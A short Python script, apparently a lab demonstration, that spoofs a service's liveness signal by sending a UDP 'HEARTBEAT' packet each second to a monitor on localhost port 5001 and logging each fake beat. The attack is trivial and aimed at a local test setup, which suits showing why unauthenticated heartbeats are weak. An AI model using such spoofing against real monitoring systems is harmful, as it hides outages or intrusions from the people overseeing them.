
import socket
import time
from datetime import datetime

# Monitor configuration
MONITOR_IP = "127.0.0.1"
MONITOR_PORT = 5001

# Attack configuration
ATTACK_INTERVAL = 1


def spoof_heartbeat():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("Heartbeat Spoofing Attack Started")
    print(f"Target: {MONITOR_IP}:{MONITOR_PORT}")
    print("Press Ctrl+C to stop\n")

    try:
        while True:
            sock.sendto(
                b"HEARTBEAT",
                (MONITOR_IP, MONITOR_PORT)
            )

            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] Fake heartbeat sent")

            time.sleep(ATTACK_INTERVAL)

    except KeyboardInterrupt:
        print("\nAttack stopped")

    finally:
        sock.close()


if __name__ == "__main__":
    spoof_heartbeat()
